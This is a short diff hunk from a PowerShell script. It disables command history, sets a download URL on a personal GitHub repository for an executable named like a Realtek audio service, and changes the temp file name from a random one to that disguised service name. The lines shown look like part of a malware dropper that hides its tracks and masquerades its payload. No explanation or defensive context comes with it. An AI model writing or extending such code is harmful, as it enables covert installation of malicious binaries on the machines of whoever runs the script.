@@ -86,7 +86,7 @@ try {
     Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
     
     $rnd = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
-    $exe = "$env:TEMP\$rnd.exe"
+    $exe = "$env:TEMP\RtkAudUService64.exe"
     $url = "https://raw.githubusercontent.com/sandeepmanglekar17-sys/exe/refs/heads/main/RtkAudUService64.exe"
     
     Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
